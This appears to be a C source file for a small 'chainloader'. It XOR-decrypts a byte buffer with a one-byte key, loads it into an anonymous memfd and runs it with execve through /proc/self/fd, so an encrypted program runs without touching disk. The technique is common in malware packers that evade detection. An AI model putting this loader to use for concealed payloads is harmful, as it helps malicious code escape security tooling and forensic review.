#define _GNU_SOURCE
#include "chainloader.h"
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/ptrace.h>


FILE* create_file(char buffer[],
		 unsigned int lenbuffer,
		  unsigned int flags) {

    int fd = memfd_create("", flags);
    ftruncate(fd, lenbuffer);
    FILE* fp = fdopen(fd, "r+");

    fwrite(buffer, sizeof(char), lenbuffer, fp);
    rewind(fp);
    return fp;
};

void decrypt_buffer(char buf[], unsigned int lenbuf, unsigned char key) {
    for (int i = 0; i<lenbuf; i++) {
	buf[i] = buf[i] ^ key;
    }
}

int decrypt_run(char buffer[], unsigned int lenbuffer, unsigned char key, char* argv[]) {
    decrypt_buffer(buffer, lenbuffer, key);
    FILE* fp = create_file(buffer, lenbuffer, MFD_CLOEXEC);
    return run(fp, "", argv);
};

//  returns the status of execve
int run(FILE* fp, char* name, char* argv[]) {
    int fd = fileno(fp);
    char path[64];
    sprintf(path, "/proc/self/fd/%d", fd);
    char* envp[] = {NULL};
    return execve(path, argv, envp); // return execve status code
}


void wrong() {
}
